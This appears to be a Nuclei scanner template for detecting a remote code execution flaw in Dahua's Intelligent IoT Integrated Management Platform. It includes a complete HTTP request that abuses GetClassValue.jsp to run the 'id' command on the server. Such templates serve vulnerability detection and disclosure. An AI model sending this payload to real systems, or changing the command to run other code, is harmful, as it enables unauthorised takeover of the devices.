# Nuclei Template: Dahua 'GetClassValue' - Remote Code Execution
**Template ID:** dahua-icc-getclassvalue-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`dahua-icc-getclassvalue-rce.yaml`)

## Vulnerability Information & PoC

## Description
Remote Code Execution Vulnerability in Dahua Intelligent IoT Integrated Management Platform via GetClassValue.jsp.

## Steps to reproduce / Exploit Payload
```http
POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
    "data": {
        "clazzName": "com.dahua.admin.util.RuntimeUtil",
        "methodName": "syncexecReturnInputStream",
        "fieldName": ["id"]
    }
}
```

## References
- https://github.com/zan8in/afrog/blob/main/pocs/afrog-pocs/vulnerability/dahua-icc-getclassvalue-rce.yaml
